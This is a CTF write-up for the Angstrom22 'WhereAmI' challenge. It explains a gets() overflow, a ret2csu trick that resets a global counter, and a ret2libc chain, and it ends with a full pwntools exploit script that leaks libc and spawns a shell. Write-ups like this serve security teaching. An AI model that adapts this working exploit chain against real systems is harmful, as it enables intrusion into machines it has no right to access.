<h2> Binary Exploitation </h2>

    - Chall Name: WhereAmI
     - CTF: Angstrom22

This challenge is basically just ret2libc but with a twist.

The catch is that there's a global variable counter that makes sure we don't get to call `main()` again but i bypassed that by decrementing the value stored in the global variable

Let's start shall we?

As usual we get the file type and protections enabled. The libc was also attached so i already patched it with `pwninit`.
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4b72c7e4-0051-4077-9f93-80380ab5eb4f)

So we're working with a x64 binary which is dynamically linked and not stripped

The only protection enabled is NX

I ran the binary to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d19c5419-a02f-442c-a9e8-b936844ea098)

It receives our input then the program exists

Loading the binary up in Ghidra and looking at the main function shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cc64162-dd05-41c9-83f6-874033724791)

```c

undefined8 main(void)

{
  char buffer [60];
  __gid_t egid;
  
  setbuf(stdout,(char *)0x0);
  egid = getegid();
  setresgid(egid,egid,egid);
  puts("I\'m so lost.");
  printf("Who are you? ");
  if (0 < counter) {
    exit(1);
  }
  counter = counter + 1;
  gets(buffer);
  puts("I hope you find yourself too.");
  return 0;
}
```

There's no other function aside that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/90baa1c7-f43c-441b-981a-6d346fa634a1)

So concerning the main function here's what it does:
- Gets the current effective group id and sets the real user id to the value returned
- It checks if the `counter` which is a global variable is greater than `0` and if it is the program exits with return code of `1`
- If the program doesn't exit it will increment the counter by `1` and receive our input using `gets()` then finally return

The vulnerability is pretty obvious to spot since the usage of `gets()` leads to buffer overflow

What next?

At first I tried to leak libc using `puts()` and jump to the next instruction which tends to increment the counter 

It worked but after I provide input the program crashes?

Here's the code snippet I used
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47cb4109-ca9d-4ee9-ac7c-9283be22ef29)

From debugging I saw that this was the issue
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/19b066da-b921-48f2-84a1-86006281bdd6)

```
 ► 0x7f7848980ad3 <gets+307>    mov    byte ptr [rbx], al

al = 0x61
rbx = 0x6161617261616131
```

We can see that it's meant to move the value of the rax register into the pointer of the rbx register

But in this case we've overwritten the value that's meant to be there making the program crash

At this point I was pretty stucked so I decided to take a look at the available rop gadgets

Looking at the gadgets shown from using `ropper` I couldn't make use of any of them

But when I used `ROPgadget` to take a look at the available gadgets I came across one that wasn't shown by `ropper`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f40a7cc8-b6d3-4b14-bea0-1d810ac3466c)

```
0x00000000004011dc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
````

Looking at it we can add the value of the `ebx` register to `rbp-0x3d` making it a `add-what-where` gadget which is useful

So let's say the counter address is stored in `rbp-0x3d` and the `ebx` register has value of `-1`

When the instruction is executed the value stored in the counter will be decremented to 0

I then decided to make use of this because it's a good primitive 

But first we need to control `ebx & rbp`

I didn't see any gadgets that allowed me to control it directly
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5fe94fe3-8750-4fe7-92f3-aff30ad855c5)

Luckily there was `__libc_csu_init`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/75450f77-1d44-4759-8ce0-db1f58859ac5)

This makes `ret2csu` viable and therefore giving us control over the `ebx & rbp` registers
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57cf7bf4-95d7-43df-8397-de6656014811)

So the goal is to first call `csu_pop == 0x00000000004012f6`

Then the following will be stored:

```
add rsp, 0x8 == padding (fill with 0)
pop rbx == 0xffffffff (-1)
pop rbp == counter + 0x3d
pop r12 == 0x0
pop r13 == 0x0
pop r14 == 0x0
pop r15 == 0x0
```

And finally we can just do the standard ret2libc attack

Here's my finally script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('whereami_patched')
elf = exe
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+162
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 72
    pop_rdi = 0x0000000000401303 # pop rdi; ret; 
    ret = 0x000000000040101a # ret; 

    csu_pad_pop = 0x00000000004012f6 # add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
    dec = 0x00000000004011dc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret

    payload = flat({
        offset: [
            csu_pad_pop,
            0x0,
            0xffffffff,
            elf.sym['counter'] + 0x3d,
            0x0,
            0x0,
            0x0,
            0x0,
            dec,
            pop_rdi,
            elf.got['puts'],
            elf.plt['puts'],
            ret,
            elf.sym['main']
        ]
    })

    io.sendlineafter('?', payload)
    io.recvuntil('too.\n')
    puts = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = puts - libc.sym['puts']
    info("libc base: %#x", libc.address)

    sh = libc.address + 0x1b45bd
    system = libc.sym['system']

    info("sh: %#x", sh)
    info("system: %#x", system)

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system

        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
```

Running it works!
[![asciicast](https://asciinema.org/a/aNGDH4s5gP9cHqRTMMAH1Kt4b.svg)](https://asciinema.org/a/aNGDH4s5gP9cHqRTMMAH1Kt4b)




